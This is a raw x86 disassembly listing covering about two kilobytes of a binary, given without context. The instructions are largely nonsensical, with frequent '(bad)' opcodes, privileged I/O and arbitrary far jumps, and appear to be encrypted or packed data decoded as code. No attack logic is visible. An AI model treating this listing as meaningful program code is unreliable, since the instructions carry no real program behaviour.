  414b17:	push   0x18b86887
  414b1c:	rcl    DWORD PTR [edi+0x113fabb1],cl
  414b22:	int    0xb5
  414b24:	mov    eax,ds:0xba0fc3ac
  414b29:	cmp    BYTE PTR [edi+0x48],dh
  414b2c:	(bad)  
  414b2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b2e:	(bad)  
  414b2f:	mov    esi,0xc9dc64b8
  414b34:	sub    cl,BYTE PTR [esi-0x15764c55]
  414b3a:	retf   
  414b3b:	aad    0x73
  414b3d:	sub    ebx,ebp
  414b3f:	and    BYTE PTR [esi+0x57bb1f9a],ah
  414b45:	sub    DWORD PTR [ecx],ecx
  414b47:	jmp    0x414b4f
  414b49:	das    
  414b4a:	mov    ch,0xf4
  414b4c:	stos   DWORD PTR es:[edi],eax
  414b4d:	pop    ebp
  414b4e:	mov    al,0xca
  414b50:	add    ch,BYTE PTR [edi-0x51]
  414b53:	loope  0x414af5
  414b55:	cwde   
  414b56:	xchg   esi,eax
  414b57:	pop    ss
  414b58:	mov    eax,ds:0x261c9ee9
  414b5d:	(bad)  
  414b5e:	push   0x3e7d0da6
  414b63:	rol    BYTE PTR [ebx],cl
  414b65:	das    
  414b66:	inc    eax
  414b67:	push   ebx
  414b68:	pop    ss
  414b69:	neg    ecx
  414b6b:	push   ss
  414b6c:	xchg   ebx,eax
  414b6d:	push   esi
  414b6e:	inc    eax
  414b6f:	mov    ds:0x564b0ae2,al
  414b74:	retf   
  414b75:	test   eax,0x51989b8f
  414b7a:	xor    al,0x84
  414b7c:	ins    DWORD PTR es:[edi],dx
  414b7d:	mov    esp,0x8d60b57e
  414b82:	mov    edi,0xff7d3c34
  414b87:	xchg   edi,eax
  414b88:	jb     0x414bad
  414b8a:	rcr    DWORD PTR [edi-0x1e],cl
  414b8d:	and    edi,DWORD PTR [eax-0x4a90406a]
  414b93:	lods   al,BYTE PTR ds:[esi]
  414b94:	push   ecx
  414b95:	in     al,dx
  414b96:	ins    BYTE PTR es:[edi],dx
  414b97:	mov    BYTE PTR [ebp+0x65],cl
  414b9a:	ja     0x414bfb
  414b9c:	mov    esp,0x8d1914d1
  414ba1:	mov    eax,0x427f8d37
  414ba6:	jecxz  0x414b5c
  414ba8:	cmc    
  414ba9:	jp     0x414bcc
  414bab:	pop    ss
  414bac:	lea    edi,[esp+ebx*1-0x55]
  414bb0:	or     al,0x6f
  414bb2:	mov    ah,0xca
  414bb4:	(bad)  
  414bb6:	(bad)  
  414bb7:	aam    0x7c
  414bb9:	call   0xb44e3a70
  414bbe:	mov    WORD PTR [esi-0x20d334bd],fs
  414bc4:	jmp    0xaa0edd0c
  414bc9:	repnz and al,0xb2
  414bcc:	cmp    ch,BYTE PTR [edi]
  414bce:	mov    ebp,0x34d706c5
  414bd3:	call   0x7e40:0xe30774b1
  414bda:	mov    bh,0xe
  414bdc:	xchg   esp,eax
  414bdd:	in     eax,0x91
  414bdf:	inc    esi
  414be0:	leave  
  414be1:	and    dh,bh
  414be3:	int3   
  414be4:	call   0x4bc7:0x71cb5217
  414beb:	pop    ecx
  414bec:	mov    ds:0x6fe95135,eax
  414bf1:	push   ecx
  414bf2:	mov    cl,0x54
  414bf4:	or     edx,esp
  414bf6:	xchg   ebp,edi
  414bf8:	xor    BYTE PTR [esi+0x3c64479f],bh
  414bfe:	pop    es
  414bff:	inc    edx
  414c00:	push   eax
  414c01:	iret   
  414c02:	(bad)  
  414c04:	push   es
  414c05:	sub    DWORD PTR [ebx-0x7b],ebx
  414c08:	das    
  414c09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c0a:	(bad)  
  414c0b:	mov    dh,0xb0
  414c0d:	je     0x414bbf
  414c0f:	xchg   DWORD PTR [edx+0x543ac4f9],ebx
  414c15:	in     al,0xbd
  414c17:	bound  edi,QWORD PTR [ecx]
  414c19:	jp     0x414c3a
  414c1b:	jl     0x414c8f
  414c1d:	lods   eax,DWORD PTR ds:[esi]
  414c1e:	enter  0xfc30,0x14
  414c22:	inc    ebx
  414c23:	push   eax
  414c24:	outs   dx,BYTE PTR ds:[esi]
  414c25:	mov    esp,0x2cdba258
  414c2a:	mov    ds:0xfb82c164,al
  414c2f:	ins    DWORD PTR es:[edi],dx
  414c30:	ins    DWORD PTR es:[edi],dx
  414c31:	add    DWORD PTR [esi-0x33],esp
  414c34:	ret    
  414c35:	pop    ecx
  414c36:	hlt    
  414c37:	out    0x6a,eax
  414c39:	les    esi,FWORD PTR [eax+esi*1]
  414c3c:	pushf  
  414c3d:	inc    edi
  414c3e:	test   eax,0x8a9d52ee
  414c43:	jo     0x414c7b
  414c45:	xor    BYTE PTR [ebx+0x5a2ad0e2],dh
  414c4b:	(bad)  
  414c4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c4d:	ss mov bh,0x5c
  414c50:	adc    eax,0x73afdd89
  414c55:	lea    edi,[edi]
  414c57:	arpl   WORD PTR [ebp+0x5d],bp
  414c5a:	mov    ah,0x7b
  414c5c:	call   0xc92fee
  414c61:	ret    
  414c62:	and    edx,0xa20da909
  414c68:	into   
  414c69:	out    0x0,eax
  414c6b:	sub    BYTE PTR [di+0x3b7e],bl
  414c70:	je     0x414c85
  414c72:	pop    ecx
  414c73:	loop   0x414c1a
  414c75:	xchg   edi,eax
  414c76:	push   ecx
  414c77:	(bad)  
  414c78:	inc    esi
  414c79:	gs mov bh,0x37
  414c7c:	fcom   QWORD PTR [ebx]
  414c7e:	sub    al,ah
  414c80:	adc    eax,0x6ef22ca5
  414c85:	int    0x5e
  414c87:	jmp    0x964e281e
  414c8c:	fmul   QWORD PTR [ebp-0x3f2d1043]
  414c92:	inc    edx
  414c93:	aaa    
  414c94:	cdq    
  414c95:	pop    ds
  414c96:	xchg   ecx,eax
  414c97:	jne    0x414ca7
  414c99:	ficomp DWORD PTR gs:[ecx+0x49fbeb6a]
  414ca0:	lods   eax,DWORD PTR ds:[esi]
  414ca1:	shl    DWORD PTR [ebp+0x35],cl
  414ca4:	xchg   BYTE PTR [edi+0x44a52bfb],cl
  414caa:	add    eax,0xdb4a2dee
  414caf:	add    cl,dh
  414cb1:	sahf   
  414cb2:	icebp  
  414cb3:	sar    BYTE PTR [eax-0x723f09ba],cl
  414cb9:	sbb    cl,BYTE PTR [ebx]
  414cbb:	lock jns 0x414cea
  414cbe:	xor    eax,0xadacde83
  414cc3:	dec    edx
  414cc4:	loope  0x414d17
  414cc6:	dec    edi
  414cc7:	pop    edx
  414cc8:	cwde   
  414cc9:	or     eax,0xe67627bc
  414cce:	(bad)  
  414ccf:	mov    esi,0x1ee2c1d5
  414cd4:	jmp    0x41525e
  414cd9:	mov    ah,0xb5
  414cdb:	xor    al,0xf
  414cdd:	xor    al,0x8e
  414cdf:	xor    al,0xb5
  414ce1:	or     dh,BYTE PTR [edx+0x26]
  414ce4:	je     0x414d3d
  414ce6:	jns    0x414d4c
  414ce8:	jb     0x414c7e
  414cea:	ror    DWORD PTR [esi+edx*1],cl
  414ced:	cmp    eax,0xd3161604
  414cf2:	shl    BYTE PTR [eax-0xbe1131a],1
  414cf8:	sahf   
  414cf9:	iret   
  414cfa:	mov    ebp,0x30b0ee04
  414cff:	mov    ebp,0xf0eb0d76
  414d04:	cmp    DWORD PTR [edx+0x22],ecx
  414d07:	add    esp,DWORD PTR [edx-0x6f]
  414d0a:	mov    eax,0x7666ffe5
  414d0f:	mov    ebx,0x2a9965e6
  414d14:	sahf   
  414d15:	jb     0x414ce7
  414d17:	loop   0x414cb9
  414d19:	das    
  414d1a:	sti    
  414d1b:	inc    ebx
  414d1c:	pop    ds
  414d1d:	push   0x33bfca77
  414d22:	jbe    0x414d7c
  414d24:	dec    esp
  414d25:	cmp    al,0x1d
  414d27:	ja     0x414d75
  414d29:	jbe    0x414cfc
  414d2b:	arpl   WORD PTR [edi-0x16319200],dx
  414d31:	adc    esp,0x308b94e0
  414d37:	stos   DWORD PTR es:[edi],eax
  414d38:	in     eax,0x49
  414d3a:	xchg   ecx,eax
  414d3b:	xlat   BYTE PTR ds:[ebx]
  414d3c:	out    0xed,eax
  414d3e:	sbb    al,0x2
  414d40:	jbe    0x414db1
  414d42:	lock stos BYTE PTR es:[edi],al
  414d44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d45:	mov    ds:0x8318cdfc,al
  414d4a:	aad    0x6e
  414d4c:	(bad)  [edx-0x70]
  414d4f:	and    DWORD PTR [ebx-0x1a],0x76
  414d53:	into   
  414d54:	cmp    eax,0xd6e161c6
  414d59:	dec    esi
  414d5a:	and    eax,0xe001b964
  414d5f:	fadd   DWORD PTR [edi]
  414d61:	and    eax,0x5056ffa9
  414d66:	dec    ebx
  414d67:	inc    eax
  414d68:	jbe    0x414de9
  414d6a:	repnz or al,dh
  414d6d:	cld    
  414d6e:	xlat   BYTE PTR ds:[ebx]
  414d6f:	add    eax,0xf18003a3
  414d74:	mov    edx,0x38ca5904
  414d79:	mul    BYTE PTR [eax]
  414d7b:	leave  
  414d7c:	lock mov ebp,DWORD PTR [eax]
  414d7f:	jno    0x414d1b
  414d81:	adc    DWORD PTR [esi],esi
  414d83:	adc    al,0xff
  414d85:	rcl    DWORD PTR [edi],cl
  414d87:	pop    eax
  414d88:	enter  0x6013,0xd5
  414d8c:	stos   BYTE PTR es:[edi],al
  414d8d:	int3   
  414d8e:	call   FWORD PTR [ebx]
  414d90:	dec    edi
  414d91:	add    eax,0xdba72b7a
  414d96:	xchg   BYTE PTR [edi],cl
  414d98:	call   0x971c:0xa78a27a7
  414d9f:	cmp    eax,0x198bdc4d
  414da4:	fldcw  WORD PTR [eax+0x77]
  414da7:	add    eax,0xa3c76b1a
  414dac:	jmp    0x5fc2a441
  414db1:	jmp    0xf1ad:0xd281a137
  414db8:	fstp   QWORD PTR [esi]
  414dba:	popa   
  414dbb:	jmp    eax
  414dbd:	sub    eax,0x266fb11
  414dc2:	bound  eax,QWORD PTR [esi+0x6c]
  414dc5:	in     eax,dx
  414dc6:	ins    DWORD PTR es:[edi],dx
  414dc7:	lea    edi,[ecx]
  414dc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dca:	push   edi
  414dcb:	pop    ebx
  414dcc:	inc    esp
  414dcd:	mov    cl,0x34
  414dcf:	adc    al,0x60
  414dd1:	add    ebx,ebx
  414dd3:	test   eax,0xaad6c34e
  414dd8:	jg     0x414e2c
  414dda:	push   cs
  414ddb:	sbb    ebx,esi
  414ddd:	sbb    ch,dh
  414ddf:	imul   ecx,DWORD PTR [ecx+0x24],0x46
  414de3:	lods   al,BYTE PTR ds:[esi]
  414de4:	pop    esp
  414de5:	jnp    0x414da6
  414de7:	xor    DWORD PTR [ebp-0x3e],0x8005ed7a
  414dee:	ret    0x2c
  414df1:	inc    esp
  414df2:	call   0x402a:0x89a61d18
  414df9:	out    0xca,eax
  414dfb:	neg    BYTE PTR [eax+0x2fa80926]
  414e01:	dec    ebp
  414e02:	mov    al,0x4c
  414e04:	rcr    edi,1
  414e06:	push   esi
  414e07:	ds das 
  414e09:	retf   0x2552
  414e0c:	cmc    
  414e0d:	rcl    edi,0x7f
  414e10:	xor    edx,esp
  414e12:	test   al,0x94
  414e14:	jbe    0x414e5d
  414e16:	loope  0x414e68
  414e18:	imul   edx,DWORD PTR [esi-0x78],0x50
  414e1c:	out    dx,al
  414e1d:	mov    ah,cl
  414e1f:	xlat   BYTE PTR ds:[ebx]
  414e20:	dec    ebx
  414e21:	adc    al,0x7c
  414e23:	addr16 mov ds:0x2416,eax
  414e27:	and    al,0xae
  414e29:	or     al,0xe4
  414e2b:	adc    BYTE PTR [eax+0x1edfbe8e],0x9
  414e32:	aad    0x6e
  414e34:	nop
  414e35:	mov    ecx,eax
  414e37:	inc    ebx
  414e38:	outs   dx,BYTE PTR ds:[esi]
  414e39:	pop    ss
  414e3a:	jne    0x414df6
  414e3c:	push   ecx
  414e3d:	xchg   DWORD PTR [edx+0x30],esi
  414e40:	inc    ebp
  414e41:	jb     0x414dfb
  414e43:	pop    ds
  414e44:	mov    ebp,0x2998bc78
  414e49:	add    edx,DWORD PTR [ecx]
  414e4b:	add    al,BYTE PTR [ebp-0x77]
  414e4e:	mov    esi,0x618c39d9
  414e53:	(bad)  
  414e54:	push   ss
  414e55:	lock mov eax,0xd8cba321
  414e5b:	sbb    BYTE PTR [eax],dl
  414e5d:	enter  0xd7ab,0x58
  414e61:	dec    eax
  414e62:	icebp  
  414e63:	fsubp  st(7),st
  414e65:	jno    0x414ec3
  414e67:	fnstenv [esi+0x14]
  414e6a:	xchg   DWORD PTR [esi+ebp*8-0x9],ebp
  414e6e:	fdivr  QWORD PTR [ebx-0x66]
  414e71:	std    
  414e72:	and    al,0x91
  414e74:	inc    ebx
  414e75:	mov    bl,0xd1
  414e77:	dec    ecx
  414e78:	leave  
  414e79:	aad    0xf0
  414e7b:	mov    es,WORD PTR [eax]
  414e7d:	sub    eax,0x3ba823dc
  414e82:	mov    dl,0xfb
  414e84:	push   ebx
  414e85:	sti    
  414e86:	or     al,0x56
  414e88:	cmc    
  414e89:	je     0x414e4b
  414e8b:	ficomp WORD PTR [eax]
  414e8d:	sbb    al,0x5f
  414e8f:	js     0x414eef
  414e91:	(bad)  
  414e92:	je     0x414e4e
  414e94:	test   DWORD PTR [ecx+0x654c1993],ebx
  414e9a:	fsub   QWORD PTR [edi+0x5a0356ef]
  414ea0:	ss call 0x8362:0x8e6aae5d
  414ea8:	adc    ch,bh
  414eaa:	pusha  
  414eab:	mov    ah,0x4
  414ead:	inc    esi
  414eae:	js     0x414e49
  414eb0:	dec    edi
  414eb1:	retf   0x1b4f
  414eb4:	call   0x6f35:0x69e748d
  414ebb:	or     DWORD PTR cs:[ebp+0x7f5a9bd6],edx
  414ec2:	jae    0x414eaa
  414ec4:	ja     0x414eb8
  414ec6:	repnz lock (bad) 
  414ec9:	in     al,dx
  414eca:	(bad)  
  414ecb:	cld    
  414ecc:	je     0x414e73
  414ece:	mov    esp,0x713c9176
  414ed3:	cwde   
  414ed4:	stc    
  414ed5:	sbb    eax,0x75aef065
  414eda:	sbb    DWORD PTR [ebp-0x70],edi
  414edd:	pop    es
  414ede:	sbb    al,0x4d
  414ee0:	rol    DWORD PTR [ebx+0x1f67e3e],cl
  414ee6:	sub    al,0x38
  414ee8:	prefetcht0 BYTE PTR [eax]
  414eeb:	xchg   esp,eax
  414eec:	push   eax
  414eed:	jno    0x414f5e
  414eef:	cmp    eax,0x7e38235d
  414ef4:	dec    eax
  414ef5:	xchg   cl,bl
  414ef7:	dec    eax
  414ef8:	pop    eax
  414ef9:	push   ebx
  414efa:	and    BYTE PTR [ebp+0x70],dl
  414efd:	jno    0x414f2f
  414eff:	in     eax,0xb6
  414f01:	push   ss
  414f02:	push   es
  414f03:	push   ds
  414f04:	jno    0x414ee6
  414f06:	call   0xdc6a3762
  414f0b:	jp     0x414f59
  414f0d:	sbb    al,0xe
  414f0f:	jmp    FWORD PTR [edi-0x1c619eae]
  414f15:	push   eax
  414f16:	add    al,0x17
  414f18:	retf   
  414f19:	sahf   
  414f1a:	sbb    edi,DWORD PTR [edx-0x50]
  414f1d:	adc    edx,DWORD PTR [edi-0x26]
  414f20:	(bad)  
  414f21:	cmp    eax,0x806d013d
  414f26:	fs push ds
  414f28:	push   edx
  414f29:	adc    BYTE PTR [edi-0x23],ch
  414f2c:	mov    edi,0xddf47f57
  414f31:	ss xchg esp,eax
  414f33:	enter  0x619d,0xc2
  414f37:	mov    al,ds:0x9ae547fd
  414f3c:	mov    dl,bl
  414f3e:	mov    esi,0x3461243f
  414f43:	xchg   edx,edx
  414f45:	imul   edx,ebx,0xc1995048
  414f4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f4c:	add    al,0x50
  414f4e:	add    eax,0x8870162b
  414f53:	dec    esi
  414f54:	int3   
  414f55:	adc    BYTE PTR [esi],ch
  414f57:	outs   dx,DWORD PTR ds:[esi]
  414f58:	push   ebp
  414f59:	pop    ss
  414f5a:	adc    DWORD PTR [edx-0x1f],0x7912e588
  414f61:	xor    al,0xd
  414f63:	fld    DWORD PTR [eax-0x752d8e0d]
  414f69:	mov    ds:0x11f8cba4,eax
  414f6e:	jge    0x414fe9
  414f70:	inc    esi
  414f71:	jbe    0x414fd6
  414f73:	xchg   ecx,eax
  414f74:	enter  0x756b,0x90
  414f78:	call   FWORD PTR [edx+0x9]
  414f7b:	not    DWORD PTR [edi-0x51acffff]
  414f81:	std    
  414f82:	pop    esi
  414f83:	mov    edi,0x4bf53e11
  414f88:	push   ecx
  414f89:	fild   DWORD PTR [ebp-0x2f]
  414f8c:	outs   dx,BYTE PTR ds:[si]
  414f8e:	sti    
  414f8f:	sub    eax,0x5c59a463
  414f94:	arpl   WORD PTR [ebx+0x71e5bce7],dx
  414f9a:	push   0x28
  414f9c:	into   
  414f9d:	scas   eax,DWORD PTR es:[edi]
  414f9e:	jge    0x414ffe
  414fa0:	mul    BYTE PTR [ecx+esi*2]
  414fa3:	cld    
  414fa4:	add    DWORD PTR [esi+ebp*4-0x24],edx
  414fa8:	push   ds
  414fa9:	fcmovnbe st,st(0)
  414fab:	xchg   esp,eax
  414fac:	out    0x39,al
  414fae:	iret   
  414faf:	pop    ecx
  414fb0:	sub    bl,BYTE PTR [esi]
  414fb2:	les    edx,FWORD PTR [ecx+ebp*1-0x30e0e0f6]
  414fb9:	cld    
  414fba:	inc    edi
  414fbb:	xor    eax,0x363563df
  414fc0:	je     0x414fe2
  414fc2:	and    al,0xca
  414fc4:	add    ebx,DWORD PTR [eax]
  414fc6:	test   al,0xe5
  414fc8:	mov    ebx,DWORD PTR [ecx]
  414fca:	jmp    0x2c37:0xa276d1e1
  414fd1:	popa   
  414fd2:	jns    0x414fa5
  414fd4:	sbb    cl,BYTE PTR [edx-0x5e2e4d98]
  414fda:	fucomip st,st(7)
  414fdc:	or     esp,0xec6928e2
  414fe2:	sbb    al,0x39
  414fe4:	repnz stos BYTE PTR es:[edi],al
  414fe6:	push   0x2e
  414fe8:	jbe    0x414fe5
  414fea:	mov    eax,ds
  414fec:	push   ds
  414fed:	daa    
  414fee:	test   al,0xdf
  414ff0:	jae    0x415023
  414ff2:	xor    eax,0x386dc1b3
  414ff7:	mov    dh,BYTE PTR [eax-0x42]
  414ffa:	cmc    
  414ffb:	cmp    al,0xe5
  414ffd:	retw   
  414fff:	out    0xa5,al
  415001:	popf   
  415002:	aas    
  415003:	ja     0x415009
  415005:	dec    ebx
  415006:	(bad)  
  415007:	mov    bl,0x22
  415009:	xor    DWORD PTR ds:0x8c44362b,ebx
  41500f:	and    DWORD PTR [edx+0x13],esi
  415012:	jbe    0x414fd5
  415014:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415015:	in     al,dx
  415016:	or     eax,DWORD PTR [edi]
  415018:	mov    DWORD PTR [edx-0x7],0xb1db9856
  41501f:	push   esi
  415020:	add    ah,BYTE PTR [ebp+0x579aa6e]
  415026:	(bad)  
  415027:	mov    ebx,0xdd6e3d47
  41502c:	mov    esi,0x1a5539f9
  415031:	(bad)  
  415032:	push   edi
  415034:	jecxz  0x414ff2
  415036:	call   0x676:0xc67d16df
  41503d:	xor    ebp,edi
  41503f:	and    eax,esi
  415041:	mov    edx,0x7c979395
  415046:	pop    ds
  415047:	out    dx,al
  415048:	aad    0x77
  41504a:	xor    al,0xd8
  41504c:	adc    ch,BYTE PTR [edx-0x554e14f]
  415052:	cmp    cl,BYTE PTR [esi-0x7638bc6a]
  415058:	add    bl,BYTE PTR [ebp-0x3d]
  41505b:	sbb    al,0x95
  41505d:	mov    bh,0x3d
  41505f:	sub    eax,esp
  415061:	(bad)  
  415062:	mov    ds:0x434e5b6b,al
  415067:	das    
  415068:	jne    0x415036
  41506a:	popa   
  41506b:	dec    edi
  41506c:	(bad)  
  41506d:	push   ebp
  41506e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41506f:	(bad)  
  415071:	sti    
  415072:	in     al,dx
  415073:	mov    ds:0x139c52db,al
  415078:	les    ecx,FWORD PTR [esi+0x32]
  41507b:	sbb    DWORD PTR [eax-0x50e5f9bd],ecx
  415081:	retf   
  415082:	dec    esi
  415083:	jmp    0xb1c42a05
  415088:	inc    esp
  415089:	in     eax,dx
  41508a:	(bad)  
  41508c:	push   ecx
  41508d:	jmp    0x415094
  41508f:	push   ss
  415090:	ficom  DWORD PTR [ecx]
  415092:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415093:	or     DWORD PTR [ecx+eiz*4],eax
  415096:	std    
  415097:	loope  0x415056
  415099:	(bad)  
  41509a:	ds in  al,0xf8
  41509d:	mov    ebp,0x822bf015
  4150a2:	loopne 0x4150c9
  4150a4:	scas   al,BYTE PTR es:[edi]
  4150a5:	mov    edi,DWORD PTR [ebx]
  4150a7:	pop    esi
  4150a8:	pop    ebx
  4150a9:	in     eax,0x5f
  4150ab:	or     BYTE PTR [edx+0x74508ea0],cl
  4150b1:	jle    0x4150d9
  4150b3:	adc    DWORD PTR [eax],eax
  4150b5:	addr16 push ds
  4150b7:	mov    bh,0x2c
  4150b9:	sub    ah,BYTE PTR [ebx+0x3479aa01]
  4150bf:	rol    ah,0x78
  4150c2:	jb     0x4150a9
  4150c4:	pushf  
  4150c5:	xchg   ebp,eax
  4150c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150c7:	repnz pop ecx
  4150c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150ca:	sub    al,0x50
  4150cc:	adc    DWORD PTR ds:0x47ea35ff,edx
  4150d2:	add    eax,0x6b3b7aac
  4150d7:	popa   
  4150d8:	cmp    al,0x77
  4150da:	or     dl,BYTE PTR [eax-0x1ea56a13]
  4150e0:	mov    ebx,0xc4fbd2d0
  4150e5:	sub    BYTE PTR [ecx-0x24],cl
  4150e8:	std    
  4150e9:	xor    esi,0x2d
  4150ec:	xor    ebp,DWORD PTR [ebx]
  4150ee:	in     al,dx
  4150ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150f0:	jnp    0x415124
  4150f2:	jae    0x41512c
  4150f4:	mov    bh,0x55
  4150f6:	imul   DWORD PTR [edi]
  4150f8:	stos   BYTE PTR es:[edi],al
  4150f9:	cmp    BYTE PTR [ebx+0x27ee03ae],bl
  4150ff:	xchg   DWORD PTR [edi+0x684054a8],edi
  415105:	sar    BYTE PTR ds:0x6859a28b,1
  41510b:	push   edi
  41510c:	ds out dx,al
  41510e:	mov    bl,BYTE PTR [edx+0x2c]
  415111:	bnd jno 0x415161
  415114:	inc    ebp
  415115:	mov    ebx,0x4d96b7a5
  41511a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41511b:	cmp    al,0x16
  41511d:	add    BYTE PTR [ecx],bl
  41511f:	mov    DWORD PTR [edx+edx*4+0x436e294a],edi
  415126:	fist   WORD PTR [ebx]
  415128:	loope  0x4150bc
  41512a:	(bad)  
  41512b:	std    
  41512c:	dec    esi
  41512d:	mov    al,ds:0xe7cb449c
  415132:	dec    eax
  415133:	(bad)  
  415134:	(bad)  
  415135:	not    BYTE PTR [ecx]
  415137:	fdiv   QWORD PTR ds:0x768dec51
  41513d:	mov    DWORD PTR [esi],ebx
  41513f:	in     eax,dx
  415140:	add    al,0x74
  415142:	mov    ds:0xb8241a54,al
  415147:	out    dx,al
  415148:	jmp    0x415110
  41514a:	sub    BYTE PTR [ecx-0x46],cl
  41514d:	cld    
  41514e:	adc    eax,0xb95de52d
  415153:	jno    0x415128
  415155:	pop    ecx
  415156:	js     0x41516e
  415158:	pop    ebx
  415159:	scas   al,BYTE PTR es:[edi]
  41515a:	mov    esp,fs
  41515c:	inc    ebx
  41515d:	inc    esi
  41515e:	dec    ecx
  41515f:	mov    ecx,0x42d4db6e
  415164:	or     eax,0x68e1726d
  415169:	sahf   
  41516a:	inc    ebx
  41516b:	dec    ecx
  41516c:	or     edi,DWORD PTR [edx-0x62]
  41516f:	sahf   
  415170:	xor    al,0xde
  415172:	int3   
  415173:	outs   dx,BYTE PTR ds:[esi]
  415174:	jb     0x41511b
  415176:	enter  0xc6ec,0xde
  41517a:	addr16 retf 
  41517c:	hlt    
  41517d:	add    DWORD PTR [ecx-0x7b],0x69
  415181:	loope  0x4151c7
  415183:	adc    eax,0x8f025383
  415188:	fwait
  415189:	daa    
  41518a:	iret   
  41518b:	sub    al,0x8b
  41518d:	aas    
  41518e:	inc    ecx
  41518f:	mov    edi,0x73135e65
  415194:	gs and eax,0x8efa1344
  41519a:	push   0x42e6697a
  41519f:	int3   
  4151a0:	adc    al,0x3c
  4151a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151a4:	sbb    BYTE PTR [eax+0x6ce967e8],al
  4151aa:	jbe    0x415189
  4151ac:	mov    BYTE PTR [ecx+0x47],al
  4151af:	adc    BYTE PTR [ecx-0xe],dh
  4151b2:	and    DWORD PTR [ecx],edi
  4151b4:	dec    ecx
  4151b5:	ficomp DWORD PTR [ecx]
  4151b7:	pop    es
  4151b8:	mov    bl,0xec
  4151ba:	push   0xfffffff3
  4151bc:	fcom   st(7)
  4151be:	jg     0x4151ca
  4151c0:	hlt    
  4151c1:	cmp    al,BYTE PTR [edx-0x11]
  4151c4:	mov    eax,0xcc8bc74c
  4151c9:	scas   eax,DWORD PTR es:[edi]
  4151ca:	inc    edi
  4151cb:	jo     0x41518d
  4151cd:	mov    esp,0x302f88b1
  4151d2:	stc    
  4151d3:	mov    BYTE PTR [ecx+0x2613e2ec],0x9e
  4151da:	fdivr  DWORD PTR [ebx+0x469efb1b]
  4151e0:	mov    ecx,0x7d6033d5
  4151e5:	dec    ebp
  4151e6:	jmp    0x6ad2:0x7daa2219
  4151ed:	sub    al,BYTE PTR [edx+0xf15ddc0]
  4151f3:	inc    esi
  4151f4:	push   ss
  4151f5:	pop    ecx
  4151f6:	add    al,0xd2
  4151f8:	dec    ecx
  4151f9:	fisub  DWORD PTR [edx+eiz*8-0x1cae863e]
  415200:	out    0xc0,eax
  415202:	dec    edx
  415203:	mov    eax,ds:0x4c364358
  415208:	add    eax,0xb3d21443
  41520d:	add    DWORD PTR ds:0xca678ddb,esp
  415213:	les    ecx,FWORD PTR [edx-0x356bfde4]
  415219:	add    bl,BYTE PTR [ecx+0x72]
  41521c:	adc    ecx,DWORD PTR [edi-0x73bfd873]
  415222:	std    
  415223:	xor    dl,bl
  415225:	lds    edi,FWORD PTR [ebx-0x7c]
  415228:	hlt    
  415229:	ja     0x4152a0
  41522b:	pop    ebp
  41522c:	ins    DWORD PTR es:[edi],dx
  41522d:	dec    ebp
  41522e:	icebp  
  41522f:	cs jg  0x415247
  415232:	test   edi,0x1872bf73
  415238:	dec    edx
  415239:	popf   
  41523a:	jno    0x4152a7
  41523c:	jns    0x4151ef
  41523e:	pop    esi
  41523f:	lods   eax,DWORD PTR ds:[esi]
  415240:	out    0x52,eax
  415242:	xchg   esi,eax
  415243:	mov    ch,BYTE PTR [eax+0x78]
  415246:	cli    
  415247:	ins    DWORD PTR es:[edi],dx
  415248:	adc    edx,DWORD PTR [edx+0x7afb3401]
  41524e:	or     al,0x9
  415250:	dec    ebx
  415251:	xchg   edx,eax
  415252:	aaa    
  415253:	and    eax,0x5377bc7
  415258:	int3   
  415259:	xor    dh,dl
  41525b:	cmp    eax,DWORD PTR [ecx]
  41525d:	inc    ecx
  41525e:	mov    eax,0xc0000000
  415263:	xor    edx,eax
  415265:	mov    DWORD PTR [ebp+0x14],edx
  415268:	mov    edx,DWORD PTR [esi]
  41526a:	mov    edi,DWORD PTR [esi+0x4]
  41526d:	xor    edi,0x9c0a89d8
  415273:	jmp    0x4157fd
  415278:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415279:	(bad)  
  41527a:	outs   dx,DWORD PTR ds:[esi]
  41527b:	test   DWORD PTR [ebp+0x24],esp
  41527e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41527f:	ss das 
  415281:	sahf   
  415282:	cmp    BYTE PTR [eax-0x68],ch
  415285:	into   
  415286:	les    esi,FWORD PTR [edx+0x160ccfc3]
  41528c:	cmp    eax,0x51161604
  415291:	(bad)  
  415292:	aaa    
  415293:	fisttp QWORD PTR [ebx]
  415295:	push   0xe60a4a5b
  41529a:	push   es
  41529b:	mov    edx,0xa6596fbe
  4152a0:	adc    ebp,DWORD PTR [eax-0x31383c41]
  4152a6:	xor    BYTE PTR [ebx+0x63],al
  4152a9:	and    edx,edx
  4152ab:	cmp    BYTE PTR [edi-0x7d],bh
  4152ae:	lock ret 0xfa0a
  4152b2:	loop   0x4152f8
  4152b4:	scas   eax,DWORD PTR es:[edi]
  4152b5:	cmp    al,0xcd
  4152b7:	retf   
  4152b8:	arpl   WORD PTR [esi+eax*8-0x161b30f1],sp
  4152bf:	repz dec esi
  4152c1:	repnz and eax,0x18e4f2ff
  4152c7:	push   eax
  4152c8:	jns    0x41531b
  4152ca:	ror    bl,1
  4152cc:	inc    edx
  4152cd:	mov    edi,0xa3c8e251
  4152d2:	sub    ah,al
  4152d4:	dec    ebp
  4152d5:	mov    dh,0x12
  4152d7:	je     0x4152a1
  4152d9:	fld    st(6)
  4152db:	mov    dl,0xe2
  4152dd:	imul   edx,DWORD PTR [eax+0x6caa4ec3],0xba878021
  4152e7:	test   al,0x49
  4152e9:	imul   edi,DWORD PTR [ebp+0x3f],0x6b47a9de
  4152f0:	inc    ebx
  4152f1:	in     eax,0x1d
  4152f3:	mov    ah,0xb2
  4152f5:	push   esi
  4152f6:	xor    BYTE PTR [ebx+0x5bd5c329],bh
  4152fc:	push   0xfffffffa
